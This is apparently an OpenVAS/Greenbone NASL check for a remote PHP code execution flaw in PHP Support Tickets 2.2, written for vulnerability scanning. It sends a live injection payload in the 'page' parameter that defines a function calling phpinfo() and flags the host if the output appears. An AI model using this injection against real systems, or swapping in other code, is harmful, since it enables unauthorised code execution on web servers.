CPE = "cpe:/a:triangle_solutions:php_support_tickets";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103256" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)" );
	script_bugtraq_id( 49567 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "PHP Support Tickets 'page' Parameter Remote PHP Code Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_php_support_tickets_detect.sc" );
	script_mandatory_keys( "php_support_tickets/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49567" );
	script_tag( name: "summary", value: "PHP Support Tickets is prone to a vulnerability that lets remote
  attackers execute arbitrary code because the application fails to
  sanitize user-supplied input." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to execute arbitrary PHP code within
  the context of the affected webserver process." );
	script_tag( name: "affected", value: "PHP Support Tickets 2.2 is vulnerable. Other versions may also
  be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( port: port, cpe: CPE )){
	exit( 0 );
}
url = NASLString( dir, "/index.php" );
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!buf){
	exit( 0 );
}
session_id = eregmatch( pattern: "Set-Cookie: PHPSESSID=([^;]+)", string: buf );
if(isnull( session_id[1] )){
	exit( 0 );
}
sess = session_id[1];
url = NASLString( dir, "/index.php?page=xek()%3Bfunction+PHPST_PAGENAME_XEK(){phpinfo()%3B}" );
useragent = http_get_user_agent();
host = http_host_name( port: port );
req = NASLString( "GET ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n", "Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\\r\\n", "Accept-Encoding: gzip, deflate\\r\\n", "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n", "DNT: 1\\r\\n", "Connection: keep-alive\\r\\n", "Cookie: PHPSESSID=", sess, "\\r\\n", "\\r\\n" );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( buf, "<title>phpinfo()" ) && ContainsString( buf, "php.ini" ) && ContainsString( buf, "PHP API" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

